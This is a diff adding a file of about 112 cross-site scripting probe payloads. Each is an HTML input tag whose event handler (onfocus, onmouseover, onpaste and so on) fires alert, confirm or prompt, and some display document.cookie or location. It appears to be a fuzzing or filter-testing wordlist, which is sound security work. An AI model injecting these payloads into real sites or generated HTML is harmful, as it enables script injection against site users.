@@ -1,0 +1,112 @@
+<input autofocus onfocus=alert(1)>
+<input onmouseover=alert(2)>
+<input onmouseout=alert(3)>
+<input onkeydown=alert(4)>
+<input onkeyup=alert(5)>
+<input onkeypress=alert(6)>
+<input onblur=alert(7)>
+<input onchange=alert(8)>
+<input onclick=alert(9)>
+<input ondblclick=alert(10)>
+<input oninput=alert(11)>
+<input oncontextmenu=alert(12)>
+<input oncut=alert(13)>
+<input oncopy=alert(14)>
+<input onpaste=alert(15)>
+<input onselect=alert(16)>
+<input onmousedown=alert(17)>
+<input onmouseup=alert(18)>
+<input onfocusout=alert(19)>
+<input onfocusin=alert(20)>
+<input oninvalid=alert(21)>
+<input onwheel=alert(22)>
+<input onabort=alert(23)>
+<input onanimationstart=alert(24)>
+<input onanimationend=alert(25)>
+<input onanimationiteration=alert(26)>
+<input onauxclick=alert(27)>
+<input onbeforeinput=alert(28)>
+<input onbeforecut=alert(29)>
+<input onbeforepaste=alert(30)>
+<input oncanplay=alert(31)>
+<input oncanplaythrough=alert(32)>
+<input onchange=alert(document.cookie)>
+<input onfocus=confirm('XSS')>
+<input onblur=prompt('XSS')>
+<input oninput=console.log('XSS')>
+<input onkeydown="alert('XSS via quotes')">
+<input onkeyup="alert('XSS2')">
+<input onmouseover='alert(`XSS3`)'>
+<input onmouseout="alert(String.fromCharCode(88,83,83))">
+<input onpaste="alert(document.domain)">
+<input onselect="alert(document.referrer)">
+<input onmousedown="alert(navigator.userAgent)">
+<input onmouseup="alert(window.location)">
+<input onfocus="alert(location.href)">
+<input onblur="alert(history.length)">
+<input oninvalid="alert(event.type)">
+<input oncontextmenu="alert(event.type)">
+<input oncut="alert('cut event')">
+<input oncopy="alert('copy event')">
+<input ondrag="alert('drag event')">
+<input ondragend="alert('dragend')">
+<input ondragenter="alert('dragenter')">
+<input ondragleave="alert('dragleave')">
+<input ondragover="alert('dragover')">
+<input ondragstart="alert('dragstart')">
+<input ondrop="alert('drop event')">
+<input onerror="alert('error event')">
+<input onload="alert('load event')">
+<input onscroll="alert('scroll event')">
+<input onsubmit="alert('submit event')">
+<input onreset="alert('reset event')">
+<input onresize="alert('resize event')">
+<input onselectstart="alert('selectstart event')">
+<input onwheel="alert('wheel event')">
+<input onpointercancel="alert('pointercancel')">
+<input onpointerdown="alert('pointerdown')">
+<input onpointerenter="alert('pointerenter')">
+<input onpointerleave="alert('pointerleave')">
+<input onpointermove="alert('pointermove')">
+<input onpointerout="alert('pointerout')">
+<input onpointerover="alert('pointerover')">
+<input onpointerup="alert('pointerup')">
+<input onanimationcancel="alert('animationcancel')">
+<input ongotpointercapture="alert('gotpointercapture')">
+<input onlostpointercapture="alert('lostpointercapture')">
+<input ontransitioncancel="alert('transitioncancel')">
+<input ontransitionend="alert('transitionend')">
+<input ontransitionrun="alert('transitionrun')">
+<input ontransitionstart="alert('transitionstart')">
+<input onbeforecopy="alert('beforecopy')">
+<input onbeforecut="alert('beforecut')">
+<input onbeforepaste="alert('beforepaste')">
+<input spellcheck="true" onfocus="alert('spellcheck')">
+<input type="text" value="XSS" onfocus="alert('focus')">
+<input type="password" onblur="alert('blur')">
+<input type="email" oninput="alert('input email')">
+<input type="number" onchange="alert('change')">
+<input type="search" onsearch="alert('search')">
+<input type="tel" onfocus="alert('phone focus')">
+<input type="url" onblur="alert('url blur')">
+<input type="text" onmouseenter="alert('mouseenter')">
+<input type="text" onmouseleave="alert('mouseleave')">
+<input type="text" onfocusin="alert('focusin')">
+<input type="text" onfocusout="alert('focusout')">
+<input type="text" onselect="alert('select')">
+<input type="text" ondragstart="alert('dragstart')">
+<input type="text" ondragend="alert('dragend')">
+<input type="text" ondrop="alert('drop')">
+<input type="text" oncopy="alert('copy')">
+<input type="text" oncut="alert('cut')">
+<input type="text" onpaste="alert('paste')">
+<input type="text" onkeydown="alert('keydown')">
+<input type="text" onkeypress="alert('keypress')">
+<input type="text" onkeyup="alert('keyup')">
+<input type="text" onscroll="alert('scroll')">
+<input type="text" onwheel="alert('wheel')">
+<input type="text" oninvalid="alert('invalid')">
+<input type="text" onsearch="alert('search event')">
+<input type="text" oninput="alert('input event')">
+<input type="text" onselectstart="alert('selectstart')">
+<input type="text" ondrag="alert('drag')">
